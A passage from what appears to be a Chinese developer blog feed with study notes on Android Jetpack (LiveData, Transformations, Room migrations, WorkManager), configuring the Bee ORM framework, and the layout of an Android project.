<p>将数据通过MutableLiveData包装起来，它提供三个方法<br>分别是getValue()、setValue()和postValue()方法。<br>getValue()方法用于获取LiveData中包含的数据；<br>setValue()方法用于给LiveData设置数据，但是只能在主线程中调用；<br>postValue()方法用于在非主线程中给LiveData设置数据。<br>然后在Activity中修改按钮的绑定事件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> binding.apply &#123;</span><br><span class="line">            plusOneBtn.setOnClickListener &#123;</span><br><span class="line">                viewModel.plusOne()</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            clearBtn.setOnClickListener &#123;</span><br><span class="line">                viewModel.clear()</span><br><span class="line">            &#125;</span><br><span class="line">			<span class="comment">//观察者，当检测到数据变化时，就会调用后面的方法。lambda函数中的参数就是value值</span></span><br><span class="line">            viewModel.counter.observe(<span class="built_in">this</span><span class="meta">@MainActivity</span>, Observer &#123; count -&gt;</span><br><span class="line">                infoText.text = count.toString()</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//当反转屏幕时,或者退出应用时。activity，将其存储起来</span></span><br><span class="line">    override fun <span class="title function_">onPause</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onPause()</span><br><span class="line">        sp.edit().apply &#123;</span><br><span class="line">            putInt(<span class="string">&quot;count_reserved&quot;</span>, viewModel.counter.value ?: <span class="number">0</span>)</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>observe()方法接收两个参数：第一个参数是一个LifecycleOwner对象，，Activity本身就是一个LifecycleOwner对象，因此直接传this就好；第二个参数是一个Observer接口，当counter中包含的数据发生变化时，就会回调到这里，因此我们在这里将最新的计数更新到界面上即可。<br>提问：为什么这里不使用函数式API的写法呢？<br>因为observe()方法接收的另一个参数LifecycleOwner也是一个单抽象方法接口。当一个Java方法同时接收两个单抽象方法接口参数时，要么同时使用函数式API的写法，要么都不使用函数式API的写法。由于我们第一个参数传的是this，因此第二个参<br>数就无法使用函数式API的写法了。</p>
<blockquote>
<p>比较推荐的做法是，永远只暴露不可变的LiveData给外部。这样在非ViewModel中就只能观察LiveData的数据变化，而不能给LiveData设置数据</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class MainViewModel(val countReserved: Int) : ViewModel() &#123;</span><br><span class="line">    val counter:LiveData&lt;Int&gt;</span><br><span class="line">        get() = _counter</span><br><span class="line">    </span><br><span class="line">    private val _counter = MutableLiveData&lt;Int&gt;()</span><br><span class="line"></span><br><span class="line">    init &#123;</span><br><span class="line">        _counter.value = countReserved</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fun plusOne() &#123;</span><br><span class="line">        val count = counter.value ?: 0</span><br><span class="line">        _counter.value = count + 1</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fun clear() &#123;</span><br><span class="line">        _counter.value = 0</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是官方最推荐的写法。它无法修改counter的值</p>
<h3 id="map和switchMap"><a href="#map和switchMap" class="headerlink" title="map和switchMap"></a>map和switchMap</h3><h4 id="map"><a href="#map" class="headerlink" title="map"></a>map</h4><p>作用：将实际包含数据的LiveData和仅用于观察数据的LiveData进行转化。<br>使用场景：当我们一个User对象中有姓名，年龄，地址等属性。而用户只需要知道姓名即可。年龄和地址都是不需要暴露的。此时如果暴露这些信息就不合适了。所以使用<code>map</code>可以将数据转化，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MainViewModel</span>(val countReserved: Int) : ViewModel() &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">val</span> <span class="variable">userLiveData</span> <span class="operator">=</span> MutableLiveData&lt;User&gt;()</span><br><span class="line">    val userName:LiveData&lt;String&gt; = Transformations.map(userLiveData)&#123;</span><br><span class="line">        it.firstName+it.lastName</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当userLiveData的数据发生变化时，map()方法会监听到变化并执行转换函数中的逻辑，然后再将转换之后的数据通知给userName的观察者。<strong>从以前只有一个observer观察，到现在多了一个map也会观察数据的变化</strong></p>
<h4 id="swichMap"><a href="#swichMap" class="headerlink" title="swichMap"></a>swichMap</h4><p>他的使用场景只有一个，但也极为重要：如果你获取的LivaData对象不是从那唯一的对象中获取，而是每次都会新建一个返回的话。就会出现一个问题，”observere只会监测最开始出现的那个对象，之后的对象就即便出现也不会检测到”。所以需要使用swichMap，例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MainViewModel</span>(countReserved: Int) : ViewModel() &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">private</span> <span class="type">val</span> <span class="variable">userIdLiveData</span> <span class="operator">=</span> MutableLiveData&lt;String&gt;()</span><br><span class="line">        val user: LiveData&lt;User&gt; = Transformations.switchMap(userIdLiveData) &#123; userId -&gt;</span><br><span class="line">            Repository.getUser(userId)</span><br><span class="line">        &#125;</span><br><span class="line">        fun <span class="title function_">getUser</span><span class="params">(userId: String)</span> &#123;</span><br><span class="line">            userIdLiveData.value = userId</span><br><span class="line">        &#125;</span><br><span class="line">		fun <span class="title function_">refresh</span><span class="params">()</span> &#123;</span><br><span class="line"> 			refreshLiveData.value = refreshLiveData.value</span><br><span class="line"> 		&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里即便是调用刷新，refresh方法，都会被swichMap检测到，然后他会通知前台的observer这个数据已经被更改了。而且她也只会把最新的数据通知出去。之前的数据会被丢弃</p>
<h2 id="Room"><a href="#Room" class="headerlink" title="Room"></a>Room</h2><p>他是一个成熟的ORM框架<br>Entity。用于定义封装实际数据的实体类，每个实体类都会在数据库中有一张对应的表，并且表中的列是根据实体类中的字段自动生成的。<br>Dao。Dao是数据访问对象的意思，通常会在这里对数据库的各项操作进行封装，在实际编程的时候，逻辑层就不需要和底层数据库打交道了，直接和Dao层进行交互即可。<br>Database。用于定义数据库中的关键信息，包括数据库的版本号、包含哪些实体类以及提供Dao层的访问实例。<br>他需要导入两个包和一个插件</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">apply <span class="attr">plugin:</span> <span class="string">&#x27;kotlin-kapt&#x27;</span></span><br><span class="line">dependencies &#123;</span><br><span class="line"> ...</span><br><span class="line"> implementation <span class="string">&quot;androidx.room:room-runtime:2.1.0&quot;</span></span><br><span class="line"> kapt <span class="string">&quot;androidx.room:room-compiler:2.1.0&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中kotlin-kapt插件是用来启用注解功能的。<br><strong>具体框架</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line">data <span class="keyword">class</span> <span class="title class_">User</span>(<span class="keyword">var</span> firstName: String, <span class="keyword">var</span> lastName: String, <span class="keyword">var</span> age: Int) &#123;</span><br><span class="line">    <span class="meta">@PrimaryKey(autoGenerate = true)</span></span><br><span class="line">    <span class="keyword">var</span> id: Long = <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Dao</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">UserDao</span> &#123;</span><br><span class="line">    <span class="meta">@Insert</span></span><br><span class="line">    fun <span class="title function_">insertUser</span><span class="params">(user: User)</span>: Long</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Update</span></span><br><span class="line">    fun <span class="title function_">updateUser</span><span class="params">(newUser: User)</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Query(&quot;select * from User&quot;)</span></span><br><span class="line">    fun <span class="title function_">loadAllUsers</span><span class="params">()</span>: List&lt;User&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Query(&quot;select * from User where age &gt; :age&quot;)</span></span><br><span class="line">    fun <span class="title function_">loadUsersOlderThan</span><span class="params">(age: Int)</span>: List&lt;User&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Delete</span></span><br><span class="line">    fun <span class="title function_">deleteUser</span><span class="params">(user: User)</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Query(&quot;delete from User where lastName = :lastName&quot;)</span></span><br><span class="line">    fun <span class="title function_">deleteUserByLastName</span><span class="params">(lastName: String)</span>: Int</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Database(version = 1, entities = [User::class])</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AppDatabase</span> : RoomDatabase() &#123;</span><br><span class="line">    <span class="keyword">abstract</span> fun <span class="title function_">userDao</span><span class="params">()</span>: UserDao</span><br><span class="line"></span><br><span class="line">    companion object &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">var</span> instance: AppDatabase? = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">        <span class="meta">@Synchronized</span></span><br><span class="line">        fun <span class="title function_">getDatabase</span><span class="params">(context: Context)</span>: AppDatabase &#123;</span><br><span class="line">            instance?.let &#123;</span><br><span class="line">                <span class="keyword">return</span> it</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> Room.databaseBuilder(</span><br><span class="line">                context.applicationContext,</span><br><span class="line">                AppDatabase::class.java, <span class="string">&quot;app_database&quot;</span></span><br><span class="line">            )</span><br><span class="line">                .build().apply &#123;</span><br><span class="line">                    instance = <span class="built_in">this</span></span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>AppDatabase类必须继承自RoomDatabase类，并且一定要使用abstract关键字将它声明成抽象类，然后提供相应的抽象方法<br>原则上全局应该只存在一份AppDatabase的实例。这里使用了instance变量来缓存AppDatabase的实例，然后在getDatabase()方法中判断：如果instance变量不为空就直接返回，否则就调用Room.databaseBuilder()方法来构建一个AppDatabase的实例。databaseBuilder()方法接收3个参数，注意第一个参数一定要使用applicationContext，而不能使用普通的context，否则容易出现内存泄漏的情况<br>第二个参数是AppDatabase的Class类型，第三个参数是数据库名，这些都比较简单。最后调用build()方法完成构建，并将创建出来的实例赋值给instance变量，然后返回当前实例即可。</p>
<blockquote>
<p>由于数据库操作属于耗时操作，Room默认是不允许在主线程中进行数据库操作的，因此上述代码中我们将增删改查的功能都放到了子线程中。不过为了方便测试，Room还提供了一个更加简单的方法，如下所示:</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Room.databaseBuilder(context.applicationContext, AppDatabase::class.java,<span class="string">&quot;app_database&quot;</span>)</span><br><span class="line"> .allowMainThreadQueries()</span><br><span class="line"> .build()</span><br></pre></td></tr></table></figure>
<p>这样子就允许在主线程中运行了。</p>
<h3 id="数据库升级"><a href="#数据库升级" class="headerlink" title="数据库升级"></a>数据库升级</h3><p>这个也比较麻烦，实例如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Database(version = 2, entities = [User::class, Book::class])</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AppDatabase</span> : RoomDatabase() &#123;</span><br><span class="line">    <span class="keyword">abstract</span> fun <span class="title function_">userDao</span><span class="params">()</span>: UserDao</span><br><span class="line">    <span class="keyword">abstract</span> fun <span class="title function_">bookDao</span><span class="params">()</span>: BookDao</span><br><span class="line"></span><br><span class="line">    companion object &#123;</span><br><span class="line">        <span class="type">val</span> <span class="variable">MIGRATION_1_2</span> <span class="operator">=</span> object : Migration(<span class="number">1</span>, <span class="number">2</span>) &#123;</span><br><span class="line">            override fun <span class="title function_">migrate</span><span class="params">(database: SupportSQLiteDatabase)</span> &#123;</span><br><span class="line">                database.execSQL(</span><br><span class="line">                    <span class="string">&quot;create table Book (id integer primary</span></span><br><span class="line"><span class="string">                            key autoincrement not null, name text not null,</span></span><br><span class="line"><span class="string">                    pages integer not null</span></span><br><span class="line"><span class="string">                )&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">var</span> instance: AppDatabase? = <span class="literal">null</span></span><br><span class="line">        fun <span class="title function_">getDatabase</span><span class="params">(context: Context)</span>: AppDatabase &#123;</span><br><span class="line">            instance?.let &#123;</span><br><span class="line">                <span class="keyword">return</span> it</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> Room.databaseBuilder(</span><br><span class="line">                context.applicationContext,</span><br><span class="line">                AppDatabase::class.java, <span class="string">&quot;app_database&quot;</span></span><br><span class="line">            )</span><br><span class="line">                .addMigrations(MIGRATION_1_2)</span><br><span class="line">                .build().apply &#123;</span><br><span class="line">                    instance = <span class="built_in">this</span></span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在companion object结构体中，我们实现了一个Migration的匿名类，并传入了1和 2这两个参数，表示当数据库版本从1升级到2的时候就执行这个匿名类中的升级逻辑。匿名类实例的变量命名也比较有讲究，这里命名成MIGRATION_1_2，可读性更<br>高。由于我们要新增一张Book表，所以需要在migrate()方法中编写相应的建表语句。另外必须注意的是，Book表的建表语句必须和Book实体类中声明的结构完全一致，否则Room就会抛出异常。<br>有时候，我们的升级不一定需要新建一张表，而只要新增一列，所以查看实例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">···</span><br><span class="line"><span class="type">val</span> <span class="variable">MIGRATION_2_3</span> <span class="operator">=</span> object : Migration(<span class="number">2</span>, <span class="number">3</span>) &#123;</span><br><span class="line"> override fun <span class="title function_">migrate</span><span class="params">(database: SupportSQLiteDatabase)</span> &#123;</span><br><span class="line"> database.execSQL(<span class="string">&quot;alter table Book add column author text not null</span></span><br><span class="line"><span class="string"> default &#x27;unknown&#x27;&quot;</span>)</span><br><span class="line"> 	&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ···</span><br><span class="line"> .addMigrations(MIGRATION_1_2, MIGRATION_2_3)</span><br></pre></td></tr></table></figure>

<h2 id="WorkManager"><a href="#WorkManager" class="headerlink" title="WorkManager"></a>WorkManager</h2><p>从4.4系统开始AlarmManager的触发时间由原来的精准变为不精准，5.0系统中加入了JobScheduler来处理后台任务，6.0系统中引入了Doze和App Standby模式用于降低手机被后台唤醒的频率,从8.0系统开始直接禁用了Service的后台功能，只允许使用前台Service。<br>这么频繁的功能和API变更，让开发者就很难受了，到底该如何编写后台代码才能保证应用程序在不同系统版本上的兼容性呢？<br><strong>WorkManager可以根据操作系统的版本自动选择底层是使用AlarmManager实现还是JobScheduler实现，从而降低了我们的使用成本。另外，它还支持周期性任务、链式任务处理等功能，是一个非常强大的工具。它可以保证即使在应用退出甚至手机重启的情况下，之前注册的任务仍然将会得到执行，因此WorkManager很适合用于执行一些定期和服务器进行交互的任务，比如周期性地同步数据，等等。</strong></p>
<h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>先导入依赖</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">implementation <span class="string">&quot;androidx.work:work-runtime:2.2.0&quot;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>，使用WorkManager注册的周期性任务不能保证一定会准时执行，这并不是bug，而是系统为了减少电量消耗，可能会将触发时间临近的几个任务放在一起执行，这样可以大幅度地减少CPU被唤醒的次数，从而有效延长电池的使用时间</p>
</blockquote>
<ol>
<li><p>定义一个后台任务，并实现具体的任务逻辑；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleWorker</span>(context: Context, params: WorkerParameters) : Worker(context, params) &#123;</span><br><span class="line"> override fun <span class="title function_">doWork</span><span class="params">()</span>: Result &#123;</span><br><span class="line"> Log.d(<span class="string">&quot;SimpleWorker&quot;</span>, <span class="string">&quot;do work in SimpleWorker&quot;</span>)</span><br><span class="line"> <span class="keyword">return</span> Result.success()</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>doWork()方法不会运行在主线程当中,可以用来执行耗时任务。<br>成功就返回Result.success()，失败就返回Result.failure()</p>
</li>
<li><p>配置该后台任务的运行条件和约束信息，并构建后台任务请求；<br><code>val request = OneTimeWorkRequest.Builder(SimpleWorker::class.java).build()</code><br><code>val request = PeriodicWorkRequest.Builder(SimpleWorker::class.java, 15, TimeUnit.MINUTES).build()</code>后一个代码端相比于前代码，多了个周期，会每15分钟执行一次。</p>
</li>
<li><p>将该后台任务请求传入WorkManager的enqueue()方法中，系统会在合适的时间运行。<br>最后一步<code>WorkManager.getInstance(context).enqueue(request)</code></p>
</li>
</ol>
<h3 id="处理复杂任务"><a href="#处理复杂任务" class="headerlink" title="处理复杂任务"></a>处理复杂任务</h3><p>设置延时任务：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">val</span> <span class="variable">request</span> <span class="operator">=</span> OneTimeWorkRequest.Builder(SimpleWorker::class.java)</span><br><span class="line"> .setInitialDelay(<span class="number">5</span>, TimeUnit.MINUTES)</span><br><span class="line"> .build()</span><br></pre></td></tr></table></figure>
<p>添加标签:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">val</span> <span class="variable">request</span> <span class="operator">=</span> OneTimeWorkRequest.Builder(SimpleWorker::class.java)</span><br><span class="line"> ...</span><br><span class="line"> .addTag(<span class="string">&quot;simple&quot;</span>)</span><br><span class="line"> .build()</span><br></pre></td></tr></table></figure>
<p>添加标签后，可以通过标签关掉该任务<br><code>WorkManager.getInstance(this).cancelAllWorkByTag(&quot;simple&quot;)</code><br>当然，即使没有标签，也可以通过id来取消后台任务请求：<br><code>WorkManager.getInstance(this).cancelWorkById(request.id)</code><br>使用id只能取消单个后台任务请求，而使用标签的话，则可以将同一标签名的所有后台任务请求全部取消，这个功能在逻辑复杂的场景下尤其有用。</p>
<p>设置任务重新执行：如果后台任务的doWork()方法中返回了Result.retry()那么是可以结合setBackoffCriteria()方法来重新执行任务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">val</span> <span class="variable">request</span> <span class="operator">=</span> OneTimeWorkRequest.Builder(SimpleWorker::class.java)</span><br><span class="line"> ...</span><br><span class="line"> .setBackoffCriteria(BackoffPolicy.LINEAR, <span class="number">10</span>, TimeUnit.SECONDS)</span><br><span class="line"> .build()</span><br></pre></td></tr></table></figure>
<p>Result.success()和Result.failure()又有什么作用？这两个返回值其实就是用于通知任务运行结果的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">WorkManager.getInstance(<span class="built_in">this</span>)</span><br><span class="line"> 	.getWorkInfoByIdLiveData(request.id)</span><br><span class="line"> 	.observe(<span class="built_in">this</span>) &#123; workInfo -&gt;</span><br><span class="line"> 		<span class="keyword">if</span> (workInfo.state == WorkInfo.State.SUCCEEDED) &#123;</span><br><span class="line"> 			Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;do work succeeded&quot;</span>)</span><br><span class="line"> 		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (workInfo.state == WorkInfo.State.FAILED) &#123;</span><br><span class="line"> 			Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;do work failed&quot;</span>)</span><br><span class="line"> 		&#125;</span><br><span class="line"> 	&#125;</span><br></pre></td></tr></table></figure>

<p>链式任务:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="type">val</span> <span class="variable">sync</span> <span class="operator">=</span> ...</span><br><span class="line"><span class="type">val</span> <span class="variable">compress</span> <span class="operator">=</span> ...</span><br><span class="line"><span class="type">val</span> <span class="variable">upload</span> <span class="operator">=</span> ...</span><br><span class="line">WorkManager.getInstance(<span class="built_in">this</span>)</span><br><span class="line"> .beginWith(sync)</span><br><span class="line"> .then(compress)</span><br><span class="line"> .then(upload)</span><br><span class="line"> .enqueue()</span><br></pre></td></tr></table></figure>
<p>也就是说，如果某<br>个后台任务运行失败，或者被取消了，那么接下来的后台任务就都得不到运行了</p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android(开发开源库)</title>
    <url>/posts/b978a72/</url>
    <content><![CDATA[<p>只要是编写一个库提供给其他的项目去使用，就可以统称为SDK开发。<br>SDK开发多数情况下是以实现功能逻辑为主的，而不会有ui设计。<br>SDK开发面向的用户群体从来都不是普通用户，而是其他开发者。</p>
<h1 id="简化运行时权限API"><a href="#简化运行时权限API" class="headerlink" title="简化运行时权限API"></a>简化运行时权限API</h1><p>typealias关键字可以用于给任意类型指定一个别名，如：<code>typealias PermissionCallback = (Boolean, List&lt;String&gt;) -&gt; Unit</code></p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android使用Bee框架使用数据库</title>
    <url>/posts/436594ce/</url>
    <content><![CDATA[<ol>
<li><p>首先导入所需要的依赖项</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line"><span class="comment">// https://mvnrepository.com/artifact/org.teasoft/bee</span></span><br><span class="line">    implementation <span class="string">&#x27;org.teasoft:bee:2.1.7&#x27;</span></span><br><span class="line"><span class="comment">// https://mvnrepository.com/artifact/org.teasoft/honey</span></span><br><span class="line">    implementation <span class="string">&#x27;org.teasoft:honey:2.1.7&#x27;</span></span><br><span class="line"><span class="comment">// https://mvnrepository.com/artifact/org.teasoft/bee-ext</span></span><br><span class="line">    implementation <span class="string">&#x27;org.teasoft:bee-ext:2.1.7&#x27;</span></span><br><span class="line">    <span class="comment">// https://mvnrepository.com/artifact/org.xerial/sqlite-jdbc</span></span><br><span class="line">    implementation <span class="string">&#x27;org.xerial:sqlite-jdbc:3.41.2.2&#x27;</span></span><br></pre></td></tr></table></figure>
<p>分别是bee的三个官方库和一个sqlite驱动</p>
</li>
<li><p>然后配置<code>bee.properties</code></p>
</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">bee.db.isAndroid=true</span><br><span class="line">#bee.db.driverName=org.sqlite</span><br><span class="line">bee.db.androidDbName=account.db</span><br><span class="line">bee.db.androidDbVersion=1</span><br><span class="line">bee.osql.loggerType=androidLog</span><br><span class="line">#开启查询结果字段类型转换,将支持更多类型</span><br><span class="line">bee.osql.openFieldTypeHandler=true</span><br><span class="line"></span><br><span class="line">#如果允许删除和更新整张表,需要开启</span><br><span class="line">bee.osql.notDeleteWholeRecords=false</span><br><span class="line">bee.osql.notUpdateWholeRecords=false</span><br><span class="line"></span><br><span class="line">#开启SQL语句回显</span><br><span class="line">bee.osql.showSQL=true</span><br></pre></td></tr></table></figure>

<p><strong>关键问题：如何让android打包bee.properties到软件中？</strong></p>
<p>因为android的<code>res</code>目录下只存放符合android规范的一系列文件夹和文件。<code>bee.properties</code>无法直接放入文件中<br>解决办法：<br>在android的项目下，选择新建一个目录<br><img src="https://image.zfxt.top/hexo-blog/Android%E4%BD%BF%E7%94%A8Bee%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93-2023-07-22-01-34.png"><br><img src="https://image.zfxt.top/hexo-blog/Android%E4%BD%BF%E7%94%A8Bee%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93-2023-07-02-52-09.png"></p>
<p>我们再新建一个<code>src\main\resources</code>目录，把你的<code>bee.properties</code>放到这个目录中。这个目录会随着android的打包而一起打包。<br>这样就完成了配置项的问题</p>
<ol start="3">
<li><p>然后创建你的数据库创建和升级工具</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">YouAppCreateAndUpgrade</span>() : CreateAndUpgrade &#123;</span><br><span class="line"></span><br><span class="line">    override fun <span class="title function_">onCreate</span><span class="params">()</span> &#123;</span><br><span class="line">        Log.d(<span class="string">&quot;mysql&quot;</span>,DdlToSql.toCreateTableSQL(User().javaClass))</span><br><span class="line">        Ddl.createTable(User().javaClass,<span class="literal">true</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override fun <span class="title function_">onUpgrade</span><span class="params">(oldVersion: Int, newVersion: Int)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(newVersion==<span class="number">2</span>) &#123;</span><br><span class="line">            Ddl.createTable(School().javaClass,<span class="literal">true</span>);</span><br><span class="line">            Log.i(<span class="string">&quot;onUpgrade&quot;</span>, <span class="string">&quot;你在没有卸载的情况下，在线更新到版本:&quot;</span>+newVersion);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>提出问题，暂时没有解决关于数据库该如何升级的办法</p>
</blockquote>
</li>
<li><p>创建你的主应用程序，并在<code>AndridManifest</code>中配置你的应用</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> android.app.Application</span><br><span class="line"><span class="keyword">import</span> android.content.Context</span><br><span class="line"><span class="keyword">import</span> org.teasoft.bee.android.CreateAndUpgradeRegistry</span><br><span class="line"><span class="keyword">import</span> org.teasoft.beex.android.ApplicationRegistry</span><br><span class="line"><span class="keyword">import</span> org.teasoft.beex.harmony.BeeConfigInit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BeeApplication</span>: Application() &#123;</span><br><span class="line">    override fun <span class="title function_">onCreate</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate()</span><br><span class="line">        ApplicationRegistry.register(<span class="built_in">this</span>)</span><br><span class="line">        CreateAndUpgradeRegistry.register(YouAppCreateAndUpgrade().javaClass)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">			<span class="attr">android:name</span>=<span class="string">&quot;.BeeApplication&quot;</span></span></span><br><span class="line"><span class="tag">			···</span></span><br></pre></td></tr></table></figure>
<p>然后你就可以使用bee框架的各种方法去连接和使用数据库了</p>
<blockquote>
<p>推荐到一些快速入门官方文档<a href="https://blog.csdn.net/abckingaa/article/details/121664398">1</a>   <a href="https://gitee.com/automvc/bee/wikis/">2</a></p>
</blockquote>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>android</tag>
        <tag>bee框架</tag>
      </tags>
  </entry>
  <entry>
    <title>Android入门(1)</title>
    <url>/posts/3380fc6e/</url>
    <content><![CDATA[<h1 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h1><h2 id="Project项目"><a href="#Project项目" class="headerlink" title="Project项目"></a>Project项目</h2><p>默认你已经通过idea或者android studio生成了一个android程序了。那么你将会看到如下的目录结构<br><img src="https://image.zfxt.top/hexo-blog/Android%E5%85%A5%E9%97%A8(1)-2023-06-13-25-47.png"></p>
<ul>
<li>.gradle和.idea<br>这两个目录下放置到都是Android Studio自动生成的文件，我们无需关心。</li>
<li>app<br>项目中的代码，资源等内容都是放在这个目录下的，我们后面的开发也基本在这个目录下进行</li>
<li>build<br>这个目录主要包括一些在编译时自动生成的文件，我们无需关心。</li>
<li>gradle<br>如果你使用了gradle的wrapper的话，他就会有这个文件，这个文件下主要是gradle的包。</li>
<li>.gitgnore<br>这个文件是用来将来的目录或文件排除在版本控制之外的。</li>
<li>build.gradle<br>这个是项目全局的gradle构建脚本，通常这个文件的内容不需要修改。</li>
<li>gradle.properties<br>这个文件是全局的gradle配置文件，在这里配置到属性将会影响到项目中所有的gradle编译脚本。</li>
<li>gradlew和gradlew.bat<br>这两个文件是用来在命令行界面执行gradle命令的，其汇总gradlew实在Linux或者Mac系统中使用的，gradlew.bat是在Windows中使用的。</li>
<li>local.properties<br>这个文件是用来指定本机的Android SDK路径，通常内容是自动生成的，我们并不需要修改，除非你本机的Android SDK位置发生了变化，那么将这个文件的路径改成新的位置即可。</li>
<li>setting.gralde<br>这个文件用于指定项目中所有引用的模块。一般一个项目只有一个app模块，因此该文件中也只引入了app这一模块。通常情况下，模块的引入是自动完成的，需要我们手动引修改这个文件的场景比较少。</li>
</ul>
<h2 id="App模块"><a href="#App模块" class="headerlink" title="App模块"></a>App模块</h2><p><img src="https://image.zfxt.top/hexo-blog/Android%E5%85%A5%E9%97%A8(1)-2023-06-16-51-41.png"></p>
<ul>
<li>build<br>这个目录和外层的build目录类似，也包含了一些在编译时自动生成的文件，不过他会更复杂，我们也不用考虑</li>
<li>libs<br>如果你的项目中以后你用了第三方的jar包，就需要把这些jar包都放在libs目录下。它会被自动添加到项目的构建路径中。</li>
<li>androidTest<br>此处是用来编写Android Test测试用的。</li>
<li>java<br>这里是放置我们所有Java代码的（Kotlin代码也放这），展开该目录，你将看到系统会帮我们生成了对应的Activities文件。</li>
<li>res<br>这个目录下会存放我们所有会用到的资源，包括我们在项目中使用到的所有图片，布局，字符串等资源。这个目录下也有很多子目录，图片放在drawable目录下，布局放在layout目录下，字符串放在values目录下，所以你不用担心会把整个res目录弄的乱糟糟的。</li>
<li>AndroidManifest.xml<br>这是整个Android项目的配置文件，你再程序中定义的四大组件都需要在这个文件里注册，另外还可以在这个文件里给用用程序添加权限说明。</li>
<li>test<br>也是用来编写Unit Test测试用例的。</li>
<li>.gitgnore<br>略</li>
<li>app.iml<br>idea自动生成的文件</li>
